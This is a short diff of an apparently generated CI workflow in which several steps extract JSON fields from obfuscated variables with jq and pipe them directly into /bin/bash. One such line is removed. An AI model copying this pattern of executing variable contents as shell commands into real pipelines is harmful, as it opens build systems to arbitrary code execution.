@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$lyx293" | jq -r .uuv9 | /bin/bash
           printf '%s' "$fpedg21" | jq -r .b4 | /bin/bash
           printf '%s' "$dhhdm6209" | jq -r .fqmvj944 | /bin/bash
-          printf '%s' "$tp1" | jq -r .wt215 | /bin/bash
           echo $ln3381 | jq -r .u564 | /bin/bash
 
       - name: Save results
